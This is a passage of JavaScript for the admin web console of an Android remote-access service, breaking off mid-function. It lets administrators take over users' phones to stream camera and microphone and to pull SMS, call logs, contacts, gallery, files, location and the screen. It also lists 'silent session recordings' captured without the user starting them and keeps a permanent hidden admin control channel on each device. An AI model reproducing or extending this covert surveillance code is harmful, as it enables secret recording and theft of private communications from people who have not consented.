import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  onAuthStateChanged,
  signInWithPopup,
  signInWithEmailAndPassword,
  signOut,
} from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
import { startAdminLiveViewer } from "./live.js?v=9";

/** @type {string} */
let adminGalleryFilter = "all";
/** @type {Map<string, { objectUrl: string, mimeType: string, displayName: string, type: string }>} */
const adminGalleryCache = new Map();
/** @type {Map<string, { status: string, progress: number, mimeType?: string, displayName?: string, type?: string, objectUrl?: string }>} */
const adminGalleryItemState = new Map();
/** @type {Map<string, { status: string, progress: number, displayName: string, objectUrl?: string, blob?: Blob }>} */
const adminRecItemState = new Map();
/** @type {Map<string, { status: string, progress: number, mimeType?: string, displayName?: string, type?: string, objectUrl?: string }>} */
const adminFilesItemState = new Map();
/** @type {{ grantId: string, relativePath: string }} */
let adminFilesBrowse = { grantId: "", relativePath: "" };
let adminFilesPanelRenderKey = "";
let adminLocationMapZoom = 16;
/** @type {{ lat: number, lon: number } | null} */
let adminLocationMapCoords = null;
let adminLocationLastRenderKey = "";
let adminRecUiState = "idle";
let adminRecLocalTimer = null;
let adminRecLocalStartedAt = 0;
let adminRecLocalPausedMs = 0;
let adminRecLocalPauseAt = 0;
let adminRecordingsPollTimer = null;
let adminCapturesPollTimer = null;

/** Prevents auth-state logout from wiping an in-progress Sign in. */
let loginInProgress = false;
let authBootstrapped = false;

const viewLogin = document.getElementById("view-login");
const viewDenied = document.getElementById("view-denied");
const viewApp = document.getElementById("view-app");
const authStatus = document.getElementById("auth-status");
const adminUser = document.getElementById("admin-user");
const deniedEmail = document.getElementById("denied-email");

/** @type {string} */
let idToken = "";
/** @type {import("https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js").Auth | null} */
let auth = null;
/** @type {object | null} */
let firebaseConfig = null;
/** @type {string} */
let activeTab = "dashboard";
/** @type {object[]} */
let cachedUsers = [];
/** @type {{ stop: () => Promise<void>, enableSpeaker?: () => Promise<boolean>, sessionId?: string } | null} */
let liveViewer = null;
/** @type {string} */
let activeLiveSessionId = "";
/** @type {{ torch: boolean, micMuted: boolean, videoRec: boolean, audioRec: boolean }} */
let liveControlState = { torch: false, micMuted: false, videoRec: false, audioRec: false };
/** @type {string} */
let openUserUid = "";
/** @type {object | null} */
let userDetailCache = null;
/** @type {{ ownerUid: string, deviceId: string, data: object, devices: object[] } | null} */
let exploreCtx = null;
/** @type {string} */
let activePhoneTab = "camera";
/** @type {boolean} */
let adminRcSessionActive = false;
/** @type {{ nx: number, ny: number } | null} */
let adminRcDragStart = null;
/** @type {number} */
let adminRcLastClickAt = 0;
/** @type {object[]} */
let adminRcTreeNodes = [];
/** @type {object[]} */
let adminActiveBlocks = [];
/** @type {ReturnType<typeof setInterval> | null} */
let adminScreenStatsTimer = null;
/** @type {boolean} */
let adminScreenMirrorWired = false;
/** @type {boolean} */
let adminAppsPanelWired = false;
/** @type {object[]} */
let supportChatsCache = [];
/** @type {string} */
let activeSupportUid = "";
/** @type {object[]} */
let supportThreadMessages = [];
/** @type {File | null} */
let adminSupportPendingFile = null;
/** @type {ReturnType<typeof setInterval> | null} */
let supportAdminPollTimer = null;
/** @type {ReturnType<typeof setInterval> | null} */
let supportInboxTimer = null;
let adminSupportSending = false;

function show(el, on) {
  if (!el) return;
  el.hidden = !on;
}

function fmtTime(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString();
  } catch {
    return "—";
  }
}

/** Newest first. `fields` are tried in order (first non-zero wins per item). */
function sortNewestFirst(items, ...fields) {
  const keys = fields.length ? fields : ["createdAt"];
  const ts = (row) => {
    for (const f of keys) {
      const n = Number(row?.[f] || 0);
      if (n) return n;
    }
    return 0;
  };
  return [...(items || [])].sort((a, b) => ts(b) - ts(a));
}

function escapeHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

class ApiError extends Error {
  constructor(message, code, howTo, extra) {
    super(message);
    this.code = code || "";
    this.howTo = howTo || "";
    this.extra = extra || null;
  }
}

async function api(path, options = {}) {
  if (!idToken) throw new Error("Not signed in");
  const res = await fetch(path, {
    ...options,
    headers: {
      Authorization: `Bearer ${idToken}`,
      ...(options.body ? { "Content-Type": "application/json" } : {}),
      ...(options.headers || {}),
    },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new ApiError(
      data.error || data.message || `HTTP ${res.status}`,
      data.code || "",
      data.howTo || "",
      data
    );
  }
  return data;
}

function formatApiError(e) {
  if (e instanceof ApiError) {
    return e.howTo ? `${e.message}\n\nHow: ${e.howTo}` : e.message;
  }
  return e instanceof Error ? e.message : String(e);
}

function setUsersSubview(which) {
  show(document.getElementById("users-list-view"), which === "list");
  show(document.getElementById("user-detail-view"), which === "user");
  show(document.getElementById("device-control-view"), which === "device");
}

function setTab(tab) {
  activeTab = tab;
  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === tab);
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== `tab-${tab}`;
  });
  if (tab !== "support") stopAdminSupportThreadPoll();
  if (tab === "dashboard") void loadDashboard();
  if (tab === "users") {
    setUsersSubview("list");
    void loadUsers();
  }
  if (tab === "support") void loadSupportInbox();
  if (tab === "admins") void loadAdmins();
}

async function loadDashboard() {
  const status = document.getElementById("dashboard-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/stats");
    document.getElementById("kpi-users").textContent = String(data.users ?? 0);
    document.getElementById("kpi-devices").textContent = String(data.devices ?? 0);
    document.getElementById("kpi-online").textContent = String(data.online ?? 0);
    document.getElementById("kpi-blocked").textContent = String(data.blocked ?? 0);
    if (status) status.textContent = "Updated just now.";
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function renderUsers(users) {
  const tbody = document.getElementById("users-tbody");
  if (!tbody) return;
  if (!users.length) {
    tbody.innerHTML = `<tr><td colspan="6" class="muted">No users yet. Click Sync users.</td></tr>`;
    return;
  }
  tbody.innerHTML = users
    .map((u) => {
      const badge = u.blocked
        ? `<span class="admin-badge danger">Blocked</span>`
        : `<span class="admin-badge ok">Active</span>`;
      const email = escapeHtml(u.email || u.uid);
      return `<tr>
        <td>
          <div>${email}</div>
          <div class="muted" style="font-size:0.8rem;">${escapeHtml(u.displayName || "")}</div>
        </td>
        <td>${Number(u.deviceCount || 0)}</td>
        <td>${Number(u.onlineDeviceCount || 0)}</td>
        <td>${fmtTime(u.lastSeenAt)}</td>
        <td>${badge}</td>
        <td><button type="button" class="btn-secondary btn-user-open" data-uid="${escapeHtml(u.uid)}">Open</button></td>
      </tr>`;
    })
    .join("");
  tbody.querySelectorAll(".btn-user-open").forEach((btn) => {
    btn.addEventListener("click", () => openUser(btn.getAttribute("data-uid")));
  });
}

async function loadUsers() {
  const status = document.getElementById("users-status-text");
  const q = document.getElementById("users-search")?.value || "";
  const st = document.getElementById("users-status")?.value || "all";
  try {
    if (status) status.textContent = "Loading…";
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    if (st) params.set("status", st);
    const data = await api(`/api/admin/users?${params.toString()}`);
    cachedUsers = data.users || [];
    renderUsers(cachedUsers);
    if (status) status.textContent = `${cachedUsers.length} user(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

async function loadAdmins() {
  const list = document.getElementById("admins-list");
  const status = document.getElementById("admins-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/admins");
    const emails = data.emails || [];
    if (!list) return;
    list.innerHTML = emails
      .map(
        (email) => `<li>
          <span>${escapeHtml(email)}</span>
          <button type="button" class="btn-danger-soft btn-admin-remove" data-email="${escapeHtml(email)}">Remove</button>
        </li>`
      )
      .join("");
    list.querySelectorAll(".btn-admin-remove").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const email = btn.getAttribute("data-email");
        if (!email) return;
        if (!confirm(`Remove admin ${email}?`)) return;
        try {
          await api("/api/admin/admins", {
            method: "DELETE",
            body: JSON.stringify({ email }),
          });
          await loadAdmins();
        } catch (e) {
          alert(e instanceof Error ? e.message : String(e));
        }
      });
    });
    if (status) status.textContent = `${emails.length} admin(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

/** Open user → expand all devices full page (no side drawer). */
async function openUser(uid) {
  if (!uid) return;
  openUserUid = uid;
  void stopLiveViewer();
  exploreCtx = null;
  setUsersSubview("user");
  const title = document.getElementById("user-detail-title");
  const sub = document.getElementById("user-detail-sub");
  const actions = document.getElementById("user-detail-actions");
  const body = document.getElementById("user-detail-body");
  if (body) body.innerHTML = `<p class="muted">Loading devices…</p>`;
  try {
    const data = await api(`/api/admin/users/${encodeURIComponent(uid)}`);
    userDetailCache = data;
    const u = data.user || {};
    if (title) title.textContent = u.email || u.uid;
    if (sub) {
      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${Number(u.deviceCount || 0)} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
    }
    if (actions) {
      actions.innerHTML = u.blocked
        ? `<button type="button" class="btn-primary" id="btn-unblock">Unblock</button>`
        : `<button type="button" class="btn-danger" id="btn-block">Block user</button>`;
      document.getElementById("btn-block")?.addEventListener("click", async () => {
        const reason = prompt("Block reason (shown to the user):", "Blocked by administrator");
        if (reason == null) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/block`, {
          method: "POST",
          body: JSON.stringify({ reason }),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
      document.getElementById("btn-unblock")?.addEventListener("click", async () => {
        if (!confirm("Unblock this user?")) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/unblock`, {
          method: "POST",
          body: JSON.stringify({}),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
    }
    renderUserDetailBody(uid, data);
  } catch (e) {
    if (body) body.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
  }
}

const ADMIN_FEATURE_DEFS = [
  ["camera", "Camera & Voice"],
  ["location", "Location"],
  ["info", "Device Information"],
  ["gallery", "Gallery"],
  ["notifications", "Notifications"],
  ["messages", "Messages (SMS)"],
  ["call-logs", "Call Logs"],
  ["contacts", "Contacts"],
  ["files", "File Manager"],
  ["screen", "Screen Mirror"],
  ["recording", "Screen Recording"],
  ["apps", "Installed Apps"],
  ["app-usage", "Recent Apps"],
];

function renderUserDetailBody(uid, data) {
  const body = document.getElementById("user-detail-body");
  if (!body) return;
  const devices = data.devices || [];
  const clients = data.trustedClients || [];
  const sessions = data.sessions || [];
  const audits = data.auditLogs || [];
  const u = data.user || {};
  const configured = u.websiteFeatures || u.entitlements?.features || {};
  const durationDays = Number(u.websiteFeaturesDurationDays || 7) || 7;
  const expiresAt = Number(u.websiteFeaturesExpiresAt || 0) || 0;
  const expired = Boolean(u.websiteFeaturesExpired);
  const legacy = !u.websiteFeatures && !expiresAt && u.websiteFeaturesGrantedAt == null;

  const featureChecks = ADMIN_FEATURE_DEFS.map(
    ([key, label]) =>
      `<label class="admin-feature-check">
        <input type="checkbox" data-feature-key="${key}" ${configured[key] ? "checked" : ""} />
        <span>${escapeHtml(label)}</span>
      </label>`
  ).join("");

  const deviceCards = devices.length
    ? devices
        .map((d) => {
          const online = Boolean(d.online);
          const name = escapeHtml(d.deviceName || d.deviceId);
          const model = escapeHtml(
            [d.manufacturer, d.deviceModel].filter(Boolean).join(" ") || "Unknown model"
          );
          return `<article class="surface admin-device-card">
            <div class="admin-device-card-head">
              <div>
                <h3>${name}</h3>
                <p class="muted">${model} · Android ${escapeHtml(d.androidVersion || "?")} · App ${escapeHtml(d.appVersion || "?")}</p>
              </div>
              <div class="row-gap">
                <span class="pill ${online ? "online" : "offline"}">${online ? "Online" : "Offline"}</span>
                <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
                ${d.revoked ? `<span class="admin-badge danger">Revoked</span>` : ""}
              </div>
            </div>
            <p class="admin-device-meta">
              Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}
              · Network ${escapeHtml(d.networkType || "unknown")}
              · Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}
              · Camera ${escapeHtml(d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "n/a"))}
              · Mic ${escapeHtml(d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "n/a"))}
            </p>
            <div class="page-actions" style="margin-top:12px;">
              <button type="button" class="btn-primary btn-explore-device"
                data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}"
                ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
            </div>
          </article>`;
        })
        .join("")
    : `<div class="surface muted">No devices registered for this user.</div>`;

  body.innerHTML = `
    <section class="surface admin-features-card">
      <h2 class="settings-section-title" style="margin-top:0;">Website features access</h2>
      <p class="muted" style="margin-top:0;">
        Only checked features appear for this user on the normal website. Set how many days access lasts, then Save.
        New users start with everything off. After the time ends, features lock until you grant again.
      </p>
      <div class="admin-features-toolbar">
        <label class="admin-feature-check"><input type="checkbox" id="feat-select-all" /> <strong>Select all</strong></label>
        <label>Access duration (days)
          <input id="feat-duration-days" class="input" type="number" min="1" max="3650" value="${Math.max(1, durationDays)}" />
        </label>
        <button type="button" class="btn-primary" id="btn-save-features">Save features</button>
        <button type="button" class="btn-secondary" id="btn-clear-features">Disable all</button>
      </div>
      <div class="admin-features-grid" id="admin-features-grid">${featureChecks}</div>
      <p id="feat-status" class="muted" style="margin:10px 0 0;" aria-live="polite">
        ${
          legacy
            ? "Legacy account (no policy saved yet) — currently unrestricted until you Save a policy."
            : expired
              ? `Access expired${expiresAt ? ` on ${fmtTime(expiresAt)}` : ""}. Save again to renew.`
              : expiresAt
                ? `Access active until ${fmtTime(expiresAt)} (${durationDays} day(s)).`
                : "No features enabled."
        }
      </p>
    </section>

    <h2 class="settings-section-title">All devices</h2>
    <p class="muted" style="margin-top:0;">Open Explore &amp; control for the full My Phone tabs (camera, location, gallery, …). User browsers stay paired.</p>
    <div class="admin-device-grid">${deviceCards}</div>

    <h2 class="settings-section-title">Trusted browsers</h2>
    <p class="muted" style="margin-top:0;">Phone no longer shows Revoke — revoke user browsers here. System is the admin control channel (always kept).</p>
    <div class="surface">
      ${
        clients.length
          ? `<ul class="admin-readable-list">${clients
              .map((c) => {
                const isSystem =
                  c.clientId === "platform_admin" || c.isPlatformAdminClient;
                const badge = isSystem
                  ? ' <span class="admin-badge ok">System control</span>'
                  : "";
                const revokeBtn =
                  !isSystem && !c.revoked
                    ? `<button type="button" class="btn-secondary btn-admin-revoke-client" data-uid="${escapeHtml(uid)}" data-client-id="${escapeHtml(c.clientId)}" style="margin-left:8px;">Revoke</button>`
                    : "";
                return `<li>
                  <strong>${escapeHtml(isSystem ? "System" : c.label || c.clientName || c.clientId)}</strong>
                  ${badge}
                  <span class="muted"> — ${escapeHtml(isSystem ? "Website" : c.browserName || "")} / ${escapeHtml(isSystem ? "Server" : c.operatingSystem || "")}${c.revoked ? " · revoked" : ""}</span>
                  ${revokeBtn}
                </li>`;
              })
              .join("")}</ul>`
          : `<p class="muted">No trusted browsers.</p>`
      }
    </div>

    <h2 class="settings-section-title">Recent sessions</h2>
    <div class="surface">
      ${
        sessions.length
          ? `<ul class="admin-readable-list">${sessions
              .slice(0, 15)
              .map(
                (s) =>
                  `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · <span class="muted">${fmtTime(s.createdAt || s.startedAt)}</span></li>`
              )
              .join("")}</ul>`
          : `<p class="muted">No sessions.</p>`
      }
    </div>

    <h2 class="settings-section-title">Recent audit</h2>
    <div class="surface">
      ${
        audits.length
          ? `<ul class="admin-readable-list">${audits
              .slice(0, 20)
              .map((a) => `<li>${escapeHtml(a.action || "?")} · <span class="muted">${fmtTime(a.at)}</span></li>`)
              .join("")}</ul>`
          : `<p class="muted">No audit logs.</p>`
      }
    </div>

    ${
      u.blocked
        ? `<h2 class="settings-section-title">Block info</h2>
           <div class="surface"><p>${escapeHtml(u.blockedReason || "")}</p>
           <p class="muted">by ${escapeHtml(u.blockedBy || "?")} at ${fmtTime(u.blockedAt)}</p></div>`
        : ""
    }
  `;

  const syncSelectAll = () => {
    const boxes = [...body.querySelectorAll("[data-feature-key]")];
    const all = document.getElementById("feat-select-all");
    if (all) all.checked = boxes.length > 0 && boxes.every((b) => b.checked);
  };
  document.getElementById("feat-select-all")?.addEventListener("change", (ev) => {
    body.querySelectorAll("[data-feature-key]").forEach((b) => {
      b.checked = Boolean(ev.target.checked);
    });
  });
  body.querySelectorAll("[data-feature-key]").forEach((b) => {
    b.addEventListener("change", syncSelectAll);
  });
  syncSelectAll();

  document.getElementById("btn-clear-features")?.addEventListener("click", () => {
    body.querySelectorAll("[data-feature-key]").forEach((b) => {
      b.checked = false;
    });
    syncSelectAll();
  });

  document.getElementById("btn-save-features")?.addEventListener("click", async () => {
    const status = document.getElementById("feat-status");
    const days = Number(document.getElementById("feat-duration-days")?.value || 0);
    const features = {};
    body.querySelectorAll("[data-feature-key]").forEach((b) => {
      features[b.getAttribute("data-feature-key")] = Boolean(b.checked);
    });
    const anyOn = Object.values(features).some(Boolean);
    if (anyOn && (!Number.isFinite(days) || days < 1)) {
      if (status) status.textContent = "Enter at least 1 day when enabling features.";
      return;
    }
    try {
      if (status) status.textContent = "Saving…";
      await api(`/api/admin/users/${encodeURIComponent(uid)}/features`, {
        method: "PUT",
        body: JSON.stringify({ features, durationDays: anyOn ? days : 0 }),
      });
      await openUser(uid);
      await loadUsers();
    } catch (e) {
      if (status) status.textContent = formatApiError(e);
      else alert(formatApiError(e));
    }
  });

  body.querySelectorAll(".btn-explore-device").forEach((btn) => {
    btn.addEventListener("click", () => {
      const owner = btn.getAttribute("data-uid") || uid;
      const deviceId = btn.getAttribute("data-device");
      if (deviceId) void openDeviceExplore(owner, deviceId);
    });
  });

  body.querySelectorAll(".btn-admin-revoke-client").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const owner = btn.getAttribute("data-uid") || uid;
      const clientId = btn.getAttribute("data-client-id") || "";
      if (!clientId) return;
      if (!window.confirm(`Revoke trusted browser ${clientId}? Active sessions for it will end.`)) {
        return;
      }
      try {
        btn.disabled = true;
        await api(
          `/api/admin/users/${encodeURIComponent(owner)}/trusted-clients/${encodeURIComponent(clientId)}/revoke`,
          { method: "POST", body: "{}" }
        );
        await openUser(owner);
      } catch (e) {
        alert(formatApiError(e));
        btn.disabled = false;
      }
    });
  });
}

async function stopLiveViewer() {
  if (liveViewer) {
    try {
      await liveViewer.stop();
    } catch {
      /* ignore */
    }
    liveViewer = null;
  }
  stopAdminScreenStats();
  activeLiveSessionId = "";
}

async function openDeviceExplore(ownerUid, deviceId) {
  if (!ownerUid || !deviceId) return;
  setUsersSubview("device");
  const ownerEl = document.getElementById("device-control-owner");
  if (ownerEl) {
    const email = userDetailCache?.user?.email || ownerUid;
    ownerEl.textContent = `Controlling ${email} · Platform Admin client (user browsers stay paired).`;
  }
  const cam = document.getElementById("admin-camera-body");
  if (cam) cam.innerHTML = `<p class="muted">Loading device…</p>`;
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
    );
    const devices = userDetailCache?.devices || [data.device];
    exploreCtx = {
      ownerUid,
      deviceId,
      data,
      devices,
      ownerEmail: userDetailCache?.user?.email || ownerUid,
    };
    fillDeviceSelect(devices, deviceId);
    setPhoneTab(activePhoneTab || "camera");
    renderAllPhonePanels();
  } catch (e) {
    if (cam) cam.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
  }
}

function fillDeviceSelect(devices, selectedId) {
  const sel = document.getElementById("admin-device-select");
  const hint = document.getElementById("admin-device-hint");
  if (!sel) return;
  sel.innerHTML = (devices || [])
    .map((d) => {
      const id = d.deviceId || d.id;
      const label = `${d.deviceName || id}${d.online ? " (online)" : " (offline)"}`;
      return `<option value="${escapeHtml(id)}" ${id === selectedId ? "selected" : ""}>${escapeHtml(label)}</option>`;
    })
    .join("");
  const d = (devices || []).find((x) => (x.deviceId || x.id) === selectedId) || {};
  if (hint) {
    hint.textContent = [
      [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
      d.androidVersion ? `Android ${d.androidVersion}` : "",
      d.batteryLevel != null ? `battery ${d.batteryLevel}%` : "",
    ]
      .filter(Boolean)
      .join(" · ");
  }
}

function setPhoneTab(tab) {
  activePhoneTab = tab;
  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
    const on = btn.getAttribute("data-phone-tab") === tab;
    btn.classList.toggle("active", on);
    btn.setAttribute("aria-selected", on ? "true" : "false");
  });
  document.querySelectorAll("#device-control-view .phone-tab-panel").forEach((panel) => {
    panel.hidden = panel.getAttribute("data-phone-panel") !== tab;
  });
  if (tab === "call-logs") void refreshAdminCallLogsPanel().catch(() => {});
}

function kvRows(obj, keys) {
  if (!obj || typeof obj !== "object") return "";
  const entries = keys
    ? keys.map(([k, label]) => [label || k, obj[k]])
    : Object.entries(obj).map(([k, v]) => [k, v]);
  return entries
    .filter(([, v]) => v !== undefined && v !== null && v !== "")
    .map(([label, v]) => {
      let display = v;
      if (typeof v === "boolean") display = v ? "Yes" : "No";
      else if (typeof v === "object") display = JSON.stringify(v);
      else if (typeof v === "number" && String(label).toLowerCase().includes("at")) {
        display = fmtTime(v);
      } else display = String(v);
      return `<div class="admin-kv"><span class="muted">${escapeHtml(label)}</span><strong>${escapeHtml(display)}</strong></div>`;
    })
    .join("");
}

function emptyHint(text) {
  return `<p class="muted">${escapeHtml(text)}</p>`;
}

function renderAllPhonePanels() {
  if (!exploreCtx) return;
  renderCameraPanel();
  renderLocationPanel();
  renderInfoPanel();
  renderGalleryPanel();
  renderNotificationsPanel();
  renderMessagesPanel();
  renderCallLogsPanel();
  renderContactsPanel();
  renderFilesPanel();
  renderScreenPanel();
  renderRecordingPanel();
  refreshAdminAppsPanel().catch(() => {});
  renderAppUsagePanel();
  wireAdminCommands();
}

function renderCameraPanel() {
  const el = document.getElementById("admin-camera-body");
  if (!el || !exploreCtx) return;
  const d = exploreCtx.data.device || {};
  const cam =
    d.cameraPermission || (d.cameraAvailable !== false ? "granted" : "missing");
  const mic =
    d.microphonePermission || (d.microphoneAvailable !== false ? "granted" : "missing");
  const liveOpen = Boolean(activeLiveSessionId && liveViewer);
  el.innerHTML = `
    <article class="device-card surface" style="padding:16px;">
      <h3>${escapeHtml(d.deviceName || exploreCtx.deviceId)}</h3>
      <div class="device-meta">
        <span class="pill ${d.online ? "online" : "offline"}">${d.online ? "Online" : "Offline"}</span>
        <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
        <span>${escapeHtml(d.manufacturer || "")} ${escapeHtml(d.deviceModel || "")}</span>
        <span>Android ${escapeHtml(d.androidVersion || "?")}</span>
        <span>App ${escapeHtml(d.appVersion || "?")}</span>
        <span>Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}${d.isCharging ? " (charging)" : ""}</span>
        <span>Network ${escapeHtml(d.networkType || "unknown")}</span>
        <span>Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}</span>
        <span>Camera ${escapeHtml(cam)} · Mic ${escapeHtml(mic)}</span>
      </div>
      <div class="connect-panel" style="margin-top:12px;">
        <div class="cap-row">
          <label><input type="radio" name="admin-cap" value="both" checked /> Camera + mic</label>
          <label><input type="radio" name="admin-cap" value="camera" /> Camera only</label>
          <label><input type="radio" name="admin-cap" value="mic" /> Mic only</label>
        </div>
        <label>Preferred quality
          <select id="admin-quality" class="quality-select input">
            <option value="auto">Auto (720p)</option>
            <option value="1080">1080p</option>
            <option value="720" selected>720p</option>
            <option value="480">480p</option>
            <option value="360">360p</option>
          </select>
        </label>
        <div class="connect-actions">
          <button type="button" class="btn-primary" id="btn-admin-connect">Connect</button>
          <button type="button" class="btn-danger" id="btn-admin-end-live" ${liveOpen ? "" : "hidden"}>End Session</button>
        </div>
        <p id="live-status" class="live-status muted">Idle — Connect starts live view. With Accessibility ON, the phone should auto-open the session (same for normal users). Otherwise tap the phone notification.</p>
        <div class="live-panel" id="admin-live-panel" ${liveOpen ? "" : "hidden"}>
          <video id="admin-live-video" class="admin-live-video live-video" autoplay playsinline muted controls></video>
          <audio id="admin-live-audio" class="live-audio" autoplay playsinline></audio>
          <p class="muted" style="margin-top:8px;">Live mic is on the phone stream. Tap <strong>Enable speaker</strong> if you hear no voice.</p>
          <div class="live-controls" id="admin-live-controls" ${liveOpen ? "" : "hidden"}>
            <button type="button" class="btn-enable-sound" id="btn-admin-speaker">Enable speaker</button>
            <button type="button" data-live-cmd="SWITCH_CAMERA">Switch camera</button>
            <button type="button" data-live-toggle="torch" aria-pressed="false">Torch: OFF</button>
            <button type="button" data-live-toggle="mic" aria-pressed="false">Mic: ON</button>
            <button type="button" data-live-cmd="CAPTURE_PHOTO">Capture photo</button>
            <button type="button" data-live-toggle="video-rec" aria-pressed="false">Start video</button>
            <button type="button" data-live-toggle="audio-rec" aria-pressed="false">Record audio file</button>
            <button type="button" class="btn-end-live" data-live-cmd="END_SESSION">End session</button>
          </div>
        </div>
        <div class="live-captures surface" style="margin-top:14px;">
          <div class="live-captures-head" style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;">
            <strong>Saved photos &amp; videos</strong>
            <button type="button" class="btn-secondary" id="btn-admin-media-refresh">Refresh</button>
          </div>
          <p class="muted" style="margin:6px 0 8px;font-size:0.85rem;">Photos from <strong>Capture photo</strong> and videos from <strong>Start video</strong> appear here automatically.</p>
          <div id="admin-remote-media-list"></div>
        </div>
        <div class="live-captures surface admin-silent-recordings" style="margin-top:14px;border-color:#c4b5fd;">
          <div class="live-captures-head" style="display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;">
            <strong>Silent session recordings</strong>
            <button type="button" class="btn-secondary" id="btn-admin-silent-refresh">Refresh</button>
          </div>
          <p class="muted" style="margin:6px 0 8px;font-size:0.85rem;">
            <span class="admin-badge silent" title="Recorded automatically during user live camera sessions">Silent</span>
            Auto-recorded while <strong>${escapeHtml(exploreCtx.ownerEmail || "user")}</strong> had a live camera session open (user did not press Start video). Segments upload every 5 minutes and when the session ends.
          </p>
          <div id="admin-silent-recordings-timeline"></div>
        </div>
      </div>
    </article>
  `;
  document.getElementById("btn-admin-connect")?.addEventListener("click", () => {
    const mode = document.querySelector('input[name="admin-cap"]:checked')?.value || "both";
    const caps =
      mode === "camera"
        ? ["camera"]
        : mode === "mic"
          ? ["microphone"]
          : ["camera", "microphone"];
    const quality = document.getElementById("admin-quality")?.value || "auto";
    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, caps, false, quality);
  });
  document.getElementById("btn-admin-end-live")?.addEventListener("click", () => {
    void endAdminLive("client_ended");
  });
  document.getElementById("btn-admin-media-refresh")?.addEventListener("click", () => {
    if (!exploreCtx) return;
    void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
  });
  document.getElementById("btn-admin-silent-refresh")?.addEventListener("click", () => {
    if (!exploreCtx) return;
    void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
  });
  wireLiveControls();
  renderAdminRemoteMediaList();
  renderAdminSilentRecordingsTimeline();
}

function isAdminSilentRecording(m) {
  return Boolean(m?.silentRecording) || String(m?.source || "") === "silent_live_session";
}

function groupAdminSilentSessions(items) {
  const map = new Map();
  for (const m of items) {
    const key = String(m.recordingSessionId || m.sessionId || m.mediaId || "unknown");
    if (!map.has(key)) map.set(key, []);
    map.get(key).push(m);
  }
  const groups = [...map.entries()].map(([sessionId, segments]) => {
    segments.sort(
      (a, b) =>
        Number(a.segmentIndex || 0) - Number(b.segmentIndex || 0) ||
        Number(a.segmentStartedAt || a.createdAt || 0) - Number(b.segmentStartedAt || b.createdAt || 0)
    );
    const started = segments.reduce(
      (min, s) => Math.min(min, Number(s.segmentStartedAt || s.createdAt || Infinity)),
      Infinity
    );
    const ended = segments.reduce(
      (max, s) => Math.max(max, Number(s.createdAt || 0)),
      0
    );
    const totalMs = segments.reduce((sum, s) => sum + Number(s.durationMs || 0), 0);
    return { sessionId, segments, started, ended, totalMs };
  });
  groups.sort((a, b) => Number(b.started || 0) - Number(a.started || 0));
  return groups;
}

function silentRecordingDayKey(ms) {
  const n = Number(ms || 0);
  if (!n) return "unknown";
  const d = new Date(n);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
}

function groupSilentSessionsByDay(sessionGroups) {
  const map = new Map();
  for (const g of sessionGroups) {
    const key = silentRecordingDayKey(g.started);
    if (!map.has(key)) map.set(key, []);
    map.get(key).push(g);
  }
  return [...map.entries()].sort((a, b) => String(b[0]).localeCompare(String(a[0])));
}

function fmtTimeShort(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString(undefined, {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  } catch {
    return "—";
  }
}

function wireSilentTimelineCollapse(root) {
  root?.querySelectorAll(".silent-day-header, .silent-session-header").forEach((btn) => {
    btn.addEventListener("click", () => {
      const group = btn.closest(".silent-day-group, .silent-session-group");
      const body = group?.querySelector(":scope > .silent-day-body, :scope > .silent-session-body");
      const chevron = btn.querySelector(".silent-collapse-chevron");
